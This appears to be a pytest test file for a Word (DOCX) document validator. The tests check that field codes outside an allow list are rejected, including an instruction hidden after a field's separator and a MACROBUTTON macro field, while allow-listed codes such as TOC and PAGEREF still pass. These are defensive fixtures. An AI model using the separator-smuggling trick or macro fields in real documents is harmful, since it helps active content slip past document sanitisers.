def _field_split_by_separate(before: str, after: str) -> str:
    return (
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve"> {before} </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        f'<w:r><w:instrText xml:space="preserve"> {after} </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
    )


def _bare_instructions(*codes: str) -> str:
    return (
        "<w:p><w:r>"
        + "".join(
            f'<w:instrText xml:space="preserve"> {code} </w:instrText>' for code in codes
        )
        + "</w:r></w:p>"
    )


@pytest.mark.parametrize("code", _UNLISTED_FIELD_CODES)
def test_unlisted_code_after_the_separator_is_rejected(tmp_path: Path, code: str) -> None:
    body = "<w:p>" + _field_split_by_separate("PAGE", code) + "</w:p>"
    source = _write_package(tmp_path / "source.docx", _body_parts(body))

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_a_field_result_that_carries_no_instruction_is_still_accepted(
    tmp_path: Path,
) -> None:
    """The ordinary shape: instruction, separator, then the cached result text."""
    body = (
        "<w:p>"
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> PAGEREF Secao1 \\h </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        "<w:r><w:t>7</w:t></w:r>"
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        "</w:p>"
    )
    source = _write_package(tmp_path / "source.docx", _body_parts(body))

    office_word_worker._validate_word_source(source, "DOCX")
    delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_bare_instruction_nodes_are_judged_one_at_a_time(tmp_path: Path) -> None:
    source = _write_package(
        tmp_path / "source.docx",
        _body_parts(_bare_instructions("PAGE", "MACROBUTTON AcaoX Rotulo")),
    )

    with pytest.raises(ValueError):
        office_word_worker._validate_word_source(source, "DOCX")
    with pytest.raises(ValueError):
        delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")


def test_several_allow_listed_bare_instruction_nodes_are_accepted(
    tmp_path: Path,
) -> None:
    """Judging each node alone must not reject the protected codes themselves."""
    source = _write_package(
        tmp_path / "source.docx",
        _body_parts(
            _bare_instructions("TOC", "PAGE", "NUMPAGES", "SEQ Figura", "REF B", "PAGEREF B")
        ),
    )

    office_word_worker._validate_word_source(source, "DOCX")
    delivery_renderer.validate_final_artifact(source.read_bytes(), "DOCX")
